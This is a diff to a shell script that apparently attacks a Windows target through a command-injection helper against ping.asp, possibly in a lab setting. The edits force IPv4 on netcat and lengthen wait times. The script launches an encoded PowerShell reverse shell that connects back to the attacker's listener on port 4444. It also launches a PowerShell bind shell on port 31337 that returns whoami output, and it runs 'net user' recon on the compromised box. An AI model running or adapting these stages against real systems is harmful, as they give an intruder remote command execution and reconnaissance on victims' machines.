@@ -12,12 +12,13 @@ check_target
 
 say "reverse shell — encoded PowerShell TCP client (listener on $HOST_IP:4444)"
 LOG=$(mktemp)
-nc -l 4444 >"$LOG" 2>/dev/null &
+# -4: macOS nc otherwise prefers IPv6 and misses the guest's IPv4 connect.
+nc -4 -l 4444 >"$LOG" 2>/dev/null &
 LISTENER=$!
 sleep 1
 # start /b so ping.asp does not wait on the client.
 rce "start /b powershell -nop -enc $(ps_enc "\$c=New-Object Net.Sockets.TCPClient('$HOST_IP',4444);\$s=\$c.GetStream();\$b=[text.encoding]::ASCII.GetBytes('win01 pwned');\$s.Write(\$b,0,\$b.Length);\$c.Close()")"
-sleep 3
+sleep 5
 kill "$LISTENER" 2>/dev/null || true
 echo "---- listener caught: -------------------------------------------"
 cat "$LOG"
@@ -25,8 +26,8 @@ rm -f "$LOG"
 
 say "bind shell — PowerShell listener on the target (port 31337)"
 rce "start /b powershell -nop -enc $(ps_enc "\$l=[Net.Sockets.TcpListener]31337;\$l.Start();\$c=\$l.AcceptTcpClient();\$s=\$c.GetStream();\$b=[text.encoding]::ASCII.GetBytes((whoami));\$s.Write(\$b,0,\$b.Length);\$l.Stop()")"
-sleep 2
-printf 'whoami\n' | nc -w 3 "$TARGET" 31337 || note "no reply from the bind shell"
+sleep 3
+printf 'whoami\n' | nc -4 -w 5 "$TARGET" 31337 || note "no reply from the bind shell"
 
 say "outbound recon from the compromised box"
 rce 'net user' | strip
